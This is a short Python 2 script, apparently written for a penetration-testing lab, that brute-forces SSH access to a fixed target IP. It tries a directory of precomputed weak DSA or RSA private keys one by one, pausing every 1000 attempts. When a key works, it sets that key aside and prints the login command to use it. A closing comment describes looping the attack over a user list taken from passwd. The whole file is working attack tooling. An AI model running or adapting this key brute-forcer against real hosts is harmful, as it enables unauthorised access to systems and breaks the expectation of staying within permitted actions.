'''
@author:ic34xe
'''
import os
import string
import time
import sys

TARGET_IP = "10.11.1.136"
SSH_USERNAME = "blah"
#include rsa and dsa cert paths
RSA_PATH = "/root/PRNG/rsa/2096/"
DSA_PATH = "/root/PRNG/dsa/1024/"
#path to place tested certs
DONE_PATH = "/root/PRNG/done/"
#path to place working cert
WORKING_PATH = "/root/PRNG/working/"
DSA_LIST = os.listdir(DSA_PATH)
COUNT = 0

def TestSSH(src):
    try:
        getoutput = ""
        
        if src.endswith('.pub'):
            os.chmod(src,0644)
        else:
            os.chmod(src,0600)

        cmd = 'ssh %s@%s -i %s -o PasswordAuthentication=no hostname' % (SSH_USERNAME, TARGET_IP, src)
        pin,pout,perr = os.popen3(cmd, 'r')
        
        getoutput = str(pout.read().strip())
        
        # ic34xe Used to debug script
        #if perr >=0:
        #    print perr.read().strip()

        return getoutput
    except Exception as dex:
        print dex.message


#change the param here to test DSA/RSA
for key in DSA_LIST:
    if COUNT == 1000:
        COUNT = 0
        print "1000 attempts reached, resting for 30 seconds"
        time.sleep(30)
    else:
        src=''.join(DSA_PATH + "/" + key)
        resp = TestSSH(src)
        
        if len(resp) >= 1:
            print ''
            print 'Key Found in file: '+ key
            print 'Key moved to: %s' % WORKING_PATH
            print 'Execute: ssh %s@%s -i %s%s -o PasswordAuthentication=no' % (SSH_USERNAME, TARGET_IP, WORKING_PATH, key)
            print ''
            dst = ''.join(WORKING_PATH + key)
            os.rename(src,dst)
            break
        else:
            dst = ''.join(DONE_PATH + key)
            os.rename(src,dst)
            
    COUNT +=1


print "DONE!"



'''
to use a user list from passwd do the following

add to the for key loop to a method and call or replace the ADDMETHODHERE
section
USERLIST = "/root/Desktop/236/users.txt"
with open(USERLIST) as f:
    for line in f:
        try:
            user = line.strip()
            if user:
                 ADDMETHODHERE

        except Exception as ex:
            print ex.message
'''
